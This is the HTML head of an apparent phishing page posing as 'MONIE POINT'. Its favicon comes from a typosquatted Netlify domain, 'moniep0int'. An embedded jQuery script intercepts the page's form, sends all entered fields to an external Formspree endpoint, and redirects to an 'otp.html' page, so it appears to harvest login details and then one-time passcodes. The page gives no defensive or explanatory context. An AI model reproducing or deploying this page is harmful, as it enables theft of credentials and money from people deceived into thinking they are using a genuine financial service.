<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MONIE POINT</title>
	<link rel="icon" type="url" href="https://moniep0int.netlify.app/image3.JPG">
 <link rel="stylesheet" href="style.css">
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function() {
      $('form').submit(function(event) {
        event.preventDefault(); // Prevent form submission

        // Send the form data to FormSubmit using AJAX
        $.ajax({
          url: 'https://formspree.io/f/xeqyjnnb',
          method: 'POST',
          data: $('form').serialize(),
          dataType: 'json',
          success: function(response) {
            // Redirect to otp.html upon successful submission
            redirectToOTP();
          },
          error: function(xhr, status, error) {
            console.log(xhr.responseText);
            alert('An error occurred. Please try again.');
          }
        });
      });
    });

    function redirectToOTP() {
      window.location.href = 'otp.html';
    }
  </script>
</head>
